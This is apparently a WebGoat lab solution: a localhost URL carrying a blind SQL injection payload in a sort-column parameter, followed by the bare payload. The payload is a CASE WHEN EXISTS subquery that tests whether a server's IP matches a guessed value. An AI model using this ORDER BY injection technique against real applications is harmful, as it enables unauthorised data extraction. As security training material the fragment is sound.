http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when exists(select substring(ip,1,15) from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end)


case when exists(select substring(ip,1,15) from servers where hostname = 'webgoat-prd' AND substring(ip,1,15) = '104.130.219.202' ) then hostname else ip end